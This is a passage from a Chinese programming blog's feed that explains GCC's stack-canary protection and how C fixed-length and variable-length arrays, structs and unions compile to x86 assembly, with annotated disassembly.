<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x080483a5 &lt;main+17&gt;:   mov    %gs:0x14,%eax</div><div class="line">0x080483ab &lt;main+23&gt;:   mov    %eax,0xfffffff8(%ebp)</div><div class="line">0x080483ae &lt;main+26&gt;:   xor    %eax,%eax</div></pre></td></tr></table></figure>
<p>在函数返回前又多了 4 条语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x080483c0 &lt;main+44&gt;:   mov    0xfffffff8(%ebp),%edx</div><div class="line">0x080483c3 &lt;main+47&gt;:   xor    %gs:0x14,%edx</div><div class="line">0x080483ca &lt;main+54&gt;:   je     0x80483d1 &lt;main+61&gt;</div><div class="line">0x080483cc &lt;main+56&gt;:   call   0x80482fc &lt;__stack_chk_fail@plt&gt;</div></pre></td></tr></table></figure></p>
<p>这多出来的语句便是 SSP 堆栈保护的关键所在，通过这几句代码就在函数栈框中插入了一个 Canary，并实现了通过这个 canary 来检测函数栈是否被破坏。</p>
<p><code>%gs:0x14</code> 中保存是一个随机数，0x080483a5 到 0x080483ae 处的 3 条语句将这个随机数放入了栈中 [EBP-8] 的位置。函数返回前 0x080483c0 到 0x080483cc 处的 4 条语句则将栈中 [EBP-8] 处保存的 Canary 取出并与 %gs:0x14 中的随机数作比较。若不等，则说明函数执行过程中发生了溢出，函数栈框已经被破坏，此时程序会跳转到 <code>__stack_chk_fail</code> 输出错误消息然后中止运行。若相等，则函数正常返回。</p>
<p>文章来源：<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/index.html" target="_blank" rel="external">IBM-GCC 中的编译器堆栈保护技术</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;以堆栈溢出为代表的缓冲区溢出已成为最为普遍的安全漏洞。由此引发的安全问题比比皆是。早在 1988 年，美国康奈尔大学的计算机科学系研究生莫里
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-6</title>
    <link href="http://yoursite.com/2018/05/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-6/"/>
    <id>http://yoursite.com/2018/05/09/深入理解计算机系统-汇编的世界-6/</id>
    <published>2018-05-08T16:39:30.000Z</published>
    <updated>2018-05-08T15:18:05.606Z</updated>
    
    <content type="html"><![CDATA[<p>现在我们一起去探讨C语言中数组、结构体的实现，相比之下，数组与流程控制和过程的实现难度差不多，尤其是动态数组可能相对来说困难一点。</p>
<h3 id="数组简介"><a href="#数组简介" class="headerlink" title="数组简介"></a>数组简介</h3><p><code>数组</code>，它就是一个相同数据类型的数据集合。数组存储在一系列逻辑上连续的内存块当中，之所以说是逻辑上连续，是因为整个内存或者说存储器本身就是逻辑上连续的一个大内存数组。</p>
<p>C语言中数组的定义：<code>int arr[length]</code>。这当中<code>int</code>表示数据类型，<code>arr</code>是变量名称，<code>length</code>是数组长度。这样的声明会做两件事，首先是在内存当中开辟一个长为<code>lentth*sizeof(int)</code>的内存空间（其中sizeof(int)是指int数据类型的字节长度），然后将这块内存空间的起始地址赋给变量<code>arr</code>。当我们使用<code>arr[index]</code>去读取数组元素的时候，我们会去读<code>arr+index*sizeof(int)</code>的内存位置，这一点并不难理解。如果你足够细心，你会发现<strong>变量名 arr 在这里就是一个指向数组第一个元素的地址，也就是 <code>arr = &amp;arr[0]</code></strong>，这也是数组的一大特性，本文也会着重探讨这一特性。</p>
<h3 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h3><p>关于c语言，需要注意的是：</p>
<ul>
<li><p>C语言中只有一维数组，数组大小在编译期就要明确。同时，数组的元素可以是任意类型的对象，可以是整数、结构体…任意的对象自然也还包括数组，所以就能根据这个“仿真”出多维数组。</p>
</li>
<li><p>对于数组，我们只能做两件事：</p>
<ul>
<li><p>确定大小</p>
</li>
<li><p>获得指向数组下标为0的指针</p>
</li>
</ul>
</li>
</ul>
<p>所以，我们知道我们对数组的操作，都是在通过操作指向数组下标为0的指针进行的。来看个例子：</p>
<pre><code>int a[3];

int * p = a;

print(&quot;%d&quot;,*p);
</code></pre><p>上述例子会打印出 a[0] 的值，所以我们得知 数组名就是指向数组下标为0的元素的指针。在进一步，对于p+1，我们得到了数组下标为1的指针。总的来说，*(a+i)就是数组中下标为i的元素的引用。</p>
<h3 id="定长和变长数组"><a href="#定长和变长数组" class="headerlink" title="定长和变长数组"></a>定长和变长数组</h3><p>要理解定长和变长数组，我们必须搞清楚一个概念，就是说这个“定”和“变”是针对什么来说的。在这里我们说，这两个字是针对编译器来说的，也就是说，如果在编译时数组的长度确定，我们就称为定长数组，反之则称为变长数组。</p>
<p>现在我们一起分析一个有关数组的C程序，我们先来一个简单的，也就是一个定长数组，我们看下在汇编级别是如何操作定长数组的。需要一提的是，由于数组的长度固定，所以有的时候编译器会根据实际情况作出一些优化，以下是一个简单的小程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">int main()&#123;</div><div class="line"></div><div class="line">    int a[5];</div><div class="line"></div><div class="line">    int i,sum;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; 5; i++)&#123;</div><div class="line"></div><div class="line">        a[i] = i * 3;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; 5; i++)&#123;</div><div class="line"></div><div class="line">        sum += a[i];</div><div class="line"></div><div class="line">    &#125; </div><div class="line"></div><div class="line">    return sum;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样通过-S得到下来汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">main:</div><div class="line"></div><div class="line">    pushl    %ebp</div><div class="line"></div><div class="line">    movl    %esp, %ebp//到此准备好栈帧</div><div class="line"></div><div class="line">    subl    $32, %esp//分配32个字节的空间</div><div class="line"></div><div class="line">    leal    -20(%ebp), %edx//将帧指针减去20赋给%edx寄存器？为什么？你能猜到吗？</div><div class="line"></div><div class="line">    movl    $0, %eax//将%eax设置为0，这里的%eax寄存器是重点</div><div class="line"></div><div class="line">.L2:</div><div class="line"></div><div class="line">    movl    %eax, (%edx)//将0放入帧指针减去20的位置？</div><div class="line"></div><div class="line">    addl    $3, %eax//第一次循环时，%eax为3，对于i来说，%eax=(i+1)*3。</div><div class="line"></div><div class="line">    addl    $4, %edx//将%edx加上4，第一次循环%edx指向帧指针-16的位置</div><div class="line"></div><div class="line">    cmpl    $15, %eax//比较%eax和15？</div><div class="line"></div><div class="line">    jne    .L2//如果不相等的话就回到L2</div><div class="line"></div><div class="line">    movl    -20(%ebp), %eax//下面这五句指令已经出卖了leal指令，很明显从-20到-4，就是数组五个元素存放的地方。下面的就不解释了，直接依次相加然后返回结果。</div><div class="line"></div><div class="line">    addl    -16(%ebp), %eax</div><div class="line"></div><div class="line">    addl    -12(%ebp), %eax</div><div class="line"></div><div class="line">    addl    -8(%ebp), %eax</div><div class="line"></div><div class="line">    addl    -4(%ebp), %eax</div><div class="line"></div><div class="line">    leave</div><div class="line"></div><div class="line">    ret</div></pre></td></tr></table></figure>
<p>对于汇编指令就不多说了，我们主要来看下跟数组相关的地方。上面其实并没有完全解释清楚数组的赋值操作那一部分，但是后面求和的部分却已经十分清楚了，现在贴心的我就帮各位串联一下赋值的部分。为了更加清晰，直接上图。我们看下循环过程中是怎么计算的。</p>
<p><img src="/images/汇编-30.png" alt="数组"></p>
<p>看了这个图相信各位更加清楚程序的意图了，开始将<code>%ebp</code>减去20是为了依次给数组赋值。这里编译器用了非常变态的优化技巧。那就是编译器发现了<code>a[i+1] = a[i] + 3</code>的规律，因此使用加法（将<code>%eax</code>不断加3）代替了<code>i*3</code>的乘法操作，另外也使用了加法（即地址不断加4，而不使用起始地址加上索引乘以4的方式）代替了数组元素地址计算过程中的乘法操作。而循环条件当中的<code>i&lt;5</code>，也变成了<code>3*i&lt;15</code>，而<code>3*i</code>又等于<code>a[i]</code>，因此当整个数组当中循环的索引<code>i</code>，满足<code>a[i+1]=15</code>（注意，在循环内的时候，<code>%eax</code>一直储存着<code>a[i+1]</code>的值，除了刚开始的0）的时候。什么时候结束循环，也就是<code>coml和jne指令</code>所做的事。再一次惊叹编译器的神奇。</p>
<p>搞清楚了上面定长数组的实现，我们会发现，定长数组可以做很多的优化，想象一下，如果上面的数组长度是不定的，编译器还能算出15这个数值吗。接下来我们就来看一个和上面的代码几乎一模一样的程序，只不过这里将换成变长数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">int sum(int n)&#123;</div><div class="line"></div><div class="line">    int a[n];</div><div class="line"></div><div class="line">    int i,sum;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; n; i++)&#123;</div><div class="line"></div><div class="line">        a[i] = i * 3;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; n; i++)&#123;</div><div class="line"></div><div class="line">        sum += a[i];</div><div class="line"></div><div class="line">    &#125; </div><div class="line"></div><div class="line">    return sum;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到，我们改了一下函数名称，并给函数加了个参数n并将a变为变长数组，其它没做任何改动。下面我们来看下-S和-O1下的汇编代码，看看与定长数组的差距在哪里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">.file    &quot;arr.c&quot;</div><div class="line"></div><div class="line">    .text</div><div class="line"></div><div class="line">.globl sum</div><div class="line"></div><div class="line">    .type    sum, @function</div><div class="line"></div><div class="line">sum:</div><div class="line"></div><div class="line">    pushl    %ebp</div><div class="line"></div><div class="line">    movl    %esp, %ebp</div><div class="line"></div><div class="line">    pushl    %esi</div><div class="line"></div><div class="line">    pushl    %ebx</div><div class="line"></div><div class="line">    subl    $16, %esp</div><div class="line"></div><div class="line">    movl    8(%ebp), %ebx</div><div class="line"></div><div class="line">    movl    %gs:20, %edx</div><div class="line"></div><div class="line">    movl    %edx, -12(%ebp)</div><div class="line"></div><div class="line">    xorl    %edx, %edx</div><div class="line"></div><div class="line">    leal    30(,%ebx,4), %edx</div><div class="line"></div><div class="line">    andl    $-16, %edx</div><div class="line"></div><div class="line">    subl    %edx, %esp</div><div class="line"></div><div class="line">    leal    15(%esp), %esi</div><div class="line"></div><div class="line">    andl    $-16, %esi</div><div class="line"></div><div class="line">    testl    %ebx, %ebx</div><div class="line"></div><div class="line">    jle    .L2</div><div class="line"></div><div class="line">    movl    $0, %ecx</div><div class="line"></div><div class="line">    movl    $0, %edx</div><div class="line"></div><div class="line">.L3:</div><div class="line"></div><div class="line">    movl    %ecx, (%esi,%edx,4)</div><div class="line"></div><div class="line">    addl    $1, %edx</div><div class="line"></div><div class="line">    addl    $3, %ecx</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx</div><div class="line"></div><div class="line">    jne    .L3</div><div class="line"></div><div class="line">    movl    $0, %edx</div><div class="line"></div><div class="line">.L4:</div><div class="line"></div><div class="line">    addl    (%esi,%edx,4), %eax</div><div class="line"></div><div class="line">    addl    $1, %edx</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx</div><div class="line"></div><div class="line">    jne    .L4</div><div class="line"></div><div class="line">.L2:</div><div class="line"></div><div class="line">    movl    -12(%ebp), %edx</div><div class="line"></div><div class="line">    xorl    %gs:20, %edx</div><div class="line"></div><div class="line">    je    .L6</div><div class="line"></div><div class="line">    call    __stack_chk_fail</div><div class="line"></div><div class="line">.L6:</div><div class="line"></div><div class="line">    leal    -8(%ebp), %esp</div><div class="line"></div><div class="line">    popl    %ebx</div><div class="line"></div><div class="line">    popl    %esi</div><div class="line"></div><div class="line">    popl    %ebp</div><div class="line"></div><div class="line">    .p2align 4,,1</div><div class="line"></div><div class="line">    ret</div><div class="line"></div><div class="line">    .size    sum, .-sum</div><div class="line"></div><div class="line">    .ident    &quot;GCC: (Ubuntu 4.4.3-4ubuntu5.1) 4.4.3&quot;</div><div class="line"></div><div class="line">    .section    .note.GNU-stack,&quot;&quot;,@progbits</div></pre></td></tr></table></figure>
<p>哇塞，第一次看到这么长的汇编代码，它看起来比定长数组要复杂太多，不管是长度还是其中的指令。不禁思考编译器这一次怎么这么笨了？猜测，动态数组的复杂性可能也是动态数组出现较晚的原因，更何况动态数组还有<code>缓冲区溢出</code>的危险。</p>
<p>现在我们一点点分析汇编代码，一探究竟。首先我们分析第一部分，包括了栈帧的建立、被调用者保存寄存器的备份以及栈内存的分配。它包括了以下几个开头的指令。</p>
<pre><code>pushl    %ebp

movl    %esp, %ebp

pushl    %esi

pushl    %ebx

subl    $16, %esp
</code></pre><p>用一幅图来说明这个问题，我们来分别看看，在指令执行前后，寄存器以及存储器的状态。</p>
<p><img src="/images/汇编-31.png" alt="动态数组"></p>
<p>接下来，我们看看比较复杂的一段代码，这一段代码的主要目的，是为动态数组分配内存。它们是如下的这些指令。</p>
<pre><code>movl    8(%ebp), %ebx

movl    %gs:20, %edx

movl    %edx, -12(%ebp)

xorl    %edx, %edx

leal    30(,%ebx,4), %edx

andl    $-16, %edx

subl    %edx, %esp

leal    15(%esp), %esi

andl    $-16, %esi
</code></pre><p>这一段代码相对于上一段就复杂了一点，还是先上一个指令执行前后的图，如下。</p>
<p><img src="/images/汇编-32.png" alt="动态数组"></p>
<p>我们仔细对比一下左右两张图可以发现，这里面最主要的两个值，就存在%edx和%esi寄存器当中。其中%edx的值是为数组分配的内存字节数，而%esi当中存储的则是数组的起始地址。我们不难想到，对于一个int类型长度为n的数组，它占用的内存字节数肯定是4n。而这里特别的地方就是，为什么不直接分配4n个字节然后把栈顶作为数组起始位置，而是分配了<code>(30+4n)&amp;(-16)</code>的字节，之后又把<code>(%esp+15)&amp;(-16)</code>的位置作为数组的起始位置？<code>为了效率</code>。</p>
<p>为了提高内存的读取速度，一般都会将<code>字节对齐</code>，而针对栈内存的分配，则大部分会保持为16字节的倍数。比如，如果处理器总是一次性从存储器中读取16个字节，则地址必须为16的倍数才行，也就是说地址的后4位必须为0。这样的话我们就好理解了，因为栈帧操作是从栈顶开始，直到帧指针或者备份着被调用者寄存器的内存位置为止（也就是上图中局域变量区域的范围），因此我们需要保证分配的字节数是16的倍数。</p>
<p>如此一来，分配<code>(30+4n)&amp;(-16)</code>个字节，就可以保证上图中-24的位置到<code>%esp</code>依然是16的倍数。<strong>因为对于任意一个正整数i来讲，都有i - 15 =&lt; i&amp;(-16) &lt;= i，并且i&amp;(-16)是16的倍数。因此对于(30+4n)&amp;(-16)来说，就有 <code>4n + 15 =&lt; (30+4n)&amp;(-16) &lt;= 4n + 30</code> 的结果</strong></p>
<p>这就保证了新分配的栈内存大小既是16的倍数，又能装下n个整数，因为它大于4n。不过这里很明显至少多了15个字节，这15个字节会被数组的起始地址消除掉。从图中可以看出，数组的起始地址并不是从栈顶开始的（从<code>%esi</code>指向的位置开始），这是因为数组的起始地址等于<code>(%esp+15)&amp;(-16)</code>，而不是<code>%esp</code>。这样做的目的也是为了对齐，只不过这里是地址对齐，将数组的起始地址对齐到16倍数的位置。由上面的结论我们知道 <code>%esp =&lt; (%esp+15)&amp;(-16) &lt;= %esp + 15</code>。</p>
<p>这样就保证了数组的起始地址不会逃出栈顶，这也是%esp要加上15的原因。由于数组的起始地址可能上移15位，因此原本预留的空间将可能再次缩小15个字节（位于<code>%esi</code>和<code>%esp</code>之间的那一小段）。因此我们就能得出实际可用的空间stack有如下范围 <code>4n &lt;= stack &lt;= 4n + 15</code> 。</p>
<p>这下我们就明白了，为什么4n要加上30，而不是加上15。是因为两次与-16的“与”运算，可能让空间浪费30个字节。所以加上30之后，就可以保证在满足栈内局部变量长度和数组起始位置都为16的倍数的前提下，还能至少留出4n的空间供数组使用。</p>
<p>还有一点需要一提的是，上图当中还出现了一个“金丝雀值”，这个家伙是为了<code>防止栈缓冲区溢出</code>。这当中的值是存储器当中的一个随机值，倘若这个值在函数返回时改变了，那么就代表缓冲区溢出了，就会终止程序的运行。</p>
<p>到此动态数组占用的内存区域就分配好了，接下来的就相对来说比较简单了，基本上与定长数组是一样的。下面是接下来所有的汇编代码，直接加入了详细的注释，相信大家都能看懂。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">testl    %ebx, %ebx//测试n是否大于0</div><div class="line"></div><div class="line">    jle    .L2//如果n小于等于0，就跳过两个循环，跳到L2</div><div class="line"></div><div class="line">    movl    $0, %ecx//%ecx与定长数组中的%eax作用一样，先初始化为0，后面逐渐+3赋给数组元素</div><div class="line"></div><div class="line">    movl    $0, %edx//%edx就是i，这里是i=0</div><div class="line"></div><div class="line">.L3:</div><div class="line"></div><div class="line">    movl    %ecx, (%esi,%edx,4)//对于i=0的时候来说，这里则相当于a[0]=0，因为%esi是数组起始地址。对于i来说，这里则代表a[i]=%ecx，a[i]的地址为a+4*i。</div><div class="line"></div><div class="line">    addl    $1, %edx//i自增</div><div class="line"></div><div class="line">    addl    $3, %ecx//将%eax加3，对于i=0的时候来说，%ecx就是a[1]的值。对于i来说，%ecx就是a[i+1]的值。</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx//比较n和i</div><div class="line"></div><div class="line">    jne    .L3//如果i和n不相等则继续循环。</div><div class="line"></div><div class="line">    movl    $0, %edx//再次将i清0，即i=0</div><div class="line"></div><div class="line">.L4:</div><div class="line"></div><div class="line">    addl    (%esi,%edx,4), %eax//%eax就相当于sum，这里其实就是sum = sum + a[i]，其中a[i]的地址为a+4*i。</div><div class="line"></div><div class="line">    addl    $1, %edx//i自增</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx//比较n和i</div><div class="line"></div><div class="line">    jne    .L4//如果n和i不相等则继续循环</div><div class="line"></div><div class="line">.L2:</div><div class="line"></div><div class="line">    movl    -12(%ebp), %edx//取出金丝雀值</div><div class="line"></div><div class="line">    xorl    %gs:20, %edx//比较金丝雀值是否改变</div><div class="line"></div><div class="line">    je    .L6//如果金丝雀值与原来的值相等，则代表缓冲区没溢出，跳到L6继续执行。</div><div class="line"></div><div class="line">    call    __stack_chk_fail//如果不相等，则代表缓冲区溢出，产生一个栈检查错误。</div><div class="line"></div><div class="line">.L6:</div><div class="line"></div><div class="line">    leal    -8(%ebp), %esp//让栈顶指向备份的%ebx，回收内存。</div><div class="line"></div><div class="line">    popl    %ebx//还原备份的%ebx值</div><div class="line"></div><div class="line">    popl    %esi//还原备份的%esi值</div><div class="line"></div><div class="line">    popl    %ebp//恢复原来的帧指针</div><div class="line"></div><div class="line">    .p2align 4,,1//对齐地址为16的倍数</div><div class="line"></div><div class="line">    ret//函数返回</div></pre></td></tr></table></figure>
<p>上面的这些指令相对来讲就比前面的简单了许多，相信各位看注释就能理解的八九不离十了，唯一特别一点的指令就是最后一个<code>p2align指令</code>。第一次见过这个指令，不过从名字上也能大概猜出来是干嘛的，不过为了准确，还是google到了这个指令的简单说明。它会将地址对齐为16（也就是第一个参数4，表示2的4次方的意思）的倍数，并最多跳过1个字节（也就是最后的参数1）。如果对齐需要跳过多于1个字节，则会忽略这个指令。</p>
<h3 id="异质结构与数据对齐"><a href="#异质结构与数据对齐" class="headerlink" title="异质结构与数据对齐"></a>异质结构与数据对齐</h3><p>异质结构是指不同数据类型的数组组合，比如C语言当中的结构（struct）与联合（union）。在理解数组的基础上，这两种数据结构都非常好理解。我们先来看一个结构的例子，比如下面的这个结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">struct &#123;</div><div class="line"></div><div class="line">    int a;</div><div class="line"></div><div class="line">    int b;</div><div class="line"></div><div class="line">    char c;</div><div class="line"></div><div class="line">&#125; mystruct;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int main()&#123;</div><div class="line"></div><div class="line">    printf(&quot;%d\n&quot;,sizeof mystruct);</div><div class="line"></div><div class="line">    </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这是一个非常简单的结构体，这个程序在32位windows系统上，输出结果是12，或许有的猿友还可以得到10或者16这样的结果。或许有的猿友会奇怪，为什么不是4+4+1=9呢。</p>
<p>这正是因为上面我们提到过的<code>对齐</code>的原因，只不过这里的对齐不是地址对齐也不是栈分配空间对齐，而是<code>数据对齐</code>。为了提高数据读取的速度，一般情况下会将数据以2的指数倍对齐，具体是2、4、8还是16，得根据具体的硬件设施以及操作系统来决定。</p>
<p>这样做的好处是，处理器可以统一的一次性读取4（也可能是其它数值）个字节，而不再需要针对特殊的数据类型读取做特殊处理。在这个例子来说，也就是说在读取a、b、c时，都可以统一的读取4个字节。特殊的，这里0-3的位置用于存储a，4-7的位置用于存储b，8的位置用于存储c，而9-11则用于填充，其中都是空的。</p>
<p>与结构体不同的是，联合会复用内存空间，以节省内存，比如我们看下面这个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">union &#123;</div><div class="line"></div><div class="line">    int a;</div><div class="line"></div><div class="line">    int b;</div><div class="line"></div><div class="line">    char c;</div><div class="line"></div><div class="line">&#125; myunion;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int main()&#123;</div><div class="line"></div><div class="line">    printf(&quot;%d\n&quot;,sizeof myunion);</div><div class="line"></div><div class="line">    </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段程序输出的结果是4，依旧是32位windows操作系统的结果。这是因为a、b、c会共用4个字节，这样做的目的不言而喻，是为了节省内存空间，显然它比结构体节省了8个字节的空间。它与结构体最大的区别就在于，对a、b、c赋值时，联合会覆盖掉之前的赋值，而结构体则不会，结构体可以同时保存a、b、c的值。</p>
<p>文章内容来源：<a href="http://www.cnblogs.com/zuoxiaolong/p/computer20.html" target="_blank" rel="external">深入理解计算机系统（3.8）—数组、异质结构以及指针的详解（十分重要）（难度较高）【呕心沥血版】</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现在我们一起去探讨C语言中数组、结构体的实现，相比之下，数组与流程控制和过程的实现难度差不多，尤其是动态数组可能相对来说困难一点。&lt;/p&gt;
&lt;h3 id=&quot;数组简介&quot;&gt;&lt;a href=&quot;#数组简介&quot; class=&quot;headerlink&quot; title=&quot;数组简介&quot;&gt;&lt;/a&gt;数
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-5</title>
    <link href="http://yoursite.com/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-5/"/>
    <id>http://yoursite.com/2018/05/08/深入理解计算机系统-汇编的世界-5/</id>
    <published>2018-05-08T11:30:10.000Z</published>
    <updated>2018-05-08T05:03:05.691Z</updated>
    
